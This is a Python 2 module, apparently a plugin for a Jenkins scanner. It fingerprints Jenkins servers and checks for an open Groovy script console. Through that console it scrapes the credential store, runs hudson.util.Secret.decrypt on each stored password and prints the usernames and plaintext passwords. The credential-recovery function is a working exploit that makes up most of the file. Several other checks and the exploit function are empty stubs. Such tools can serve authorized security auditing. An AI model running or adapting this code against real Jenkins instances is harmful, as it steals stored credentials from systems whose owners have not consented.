# -*- coding: utf-8 -*-

import requests
import jenkins
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

DEFAULT_PORTS = [80, 8080, 443, 8000, 8081]
DEFAULT_PATHS = ['/', '/jenkins']
TARGET_NAME   = 'Jenkins'


def fingerprint(res):
    if res.status_code == 403:
        if res.headers.get('x-hudson') or res.headers.get('x-jenkins') or \
                        'window.location.replace(\'/login?from=' in res.text:
            if res.headers.get('x-jenkins'):
                version = res.headers.get('x-jenkins')
            else:
                version = 'unknown'
            return { 'use_security': True, 'version': version }
    if res.status_code == 200 and '<title>Dashboard [Jenkins]</title>' in res.text:
        match = re.search(r'Jenkins ver\. ([\d\.]+)', res.text)
        if match:
            version = match.group(1)
        elif res.headers.get('x-jenkins'):
            version = res.headers.get('x-jenkins')
        else:
            version = 'unknown'
        return { 'use_security': False, 'version': version }
    return None

def check_script_console(target):
    if target['url'].endswith('/'):
        script_url = target['url'] + 'script'
    else:
        script_url = target['url'] + '/script'
    try:
        res = requests.get(script_url)
        if res.status_code == 200 and \
                '<title>Jenkins</title>' in res.text and 'Script Console' in res.text:
            return { 'script_console': True }
    except requests.exceptions.RequestException as e:
        print 'Error: ' + str(e)
    except urllib3.exceptions.LocationParseError as e:
        print 'Error: ' + str(e)
    return {}

def check_cli_rmi_deserialization(target):
    pass

def check_new_job(target):
    pass

def check_credential_recovery(target):
    if 'script_console' in target['vulns']:
        if target['url'].endswith('/'):
            url = target['url']
        else:
            url = target['url'] + '/'
        res = requests.get(url + 'credential-store/domain/_/')
        soup = BeautifulSoup(res.text, 'html.parser')

        # loop to go through all hrefs and match the regex "credential" and add the urls to the users list
        users = []
        for link in soup.body.findAll('a', href=True):
            if link['href'].startswith('credential/'):
                if link['href'] not in users:
                    users.append(link['href'])

        for user in users:
            res = requests.get(url + 'credential-store/domain/_/' + user + '/update')
            if res.status_code != 200 or '_.username' not in res.text:
                continue
            soup = BeautifulSoup(res.text, 'html.parser')

            # Finds the user and password value in html and stores in encPass variable
            username = soup.body.findAll(attrs={'name': '_.username'})[0]['value']
            if re.search(r'_\.password', res.text):
                e_pass = soup.body.findAll(attrs={ 'name': '_.password'})[0]['value']
                # Encodes the password to www-form-urlencoded standards needed for the expected content type
                epass_encoded = urllib.quote(e_pass, safe='')

                # Script to run in groovy scripting engine to decrypt the password
                script = 'script=hudson.util.Secret.decrypt+%%27' \
                         '%s'\
                         '%%27&json=%%7B%%22script%%22%%3A+%%22hudson.util.Secret.decrypt+%%27' \
                         '%s' \
                         '%%27%%22%%2C+%%22%%22%%3A+%%22%%22%%7D&Submit=Run' % (epass_encoded, epass_encoded)

                # Using sessions because the POST requires a session token to be present
                with requests.Session() as s:
                    r = s.get(url + 'script')
                    headers = {'content-type': 'application/x-www-form-urlencoded'}
                    r = s.post(url + 'script', data=script, headers=headers)

                soup = BeautifulSoup(r.text, 'html.parser')

                # Extracts password from body
                password = soup.body.findAll('pre')[1].text
                password = re.sub('Result:', '', password)
                print 'User: %s | Password: %s' % (username, password.strip())
        return {}
    else:
        return {}

def assess(target):
    target['vulns'] = {}
    target['vulns'].update(check_script_console(target))
    #target['vulns'].update(check_cli_rmi_deserialization(target))
    #target['vulns'].update(check_new_job(target))
    target['vulns'].update(check_credential_recovery(target))
    return target

def exploit(target):
    pass
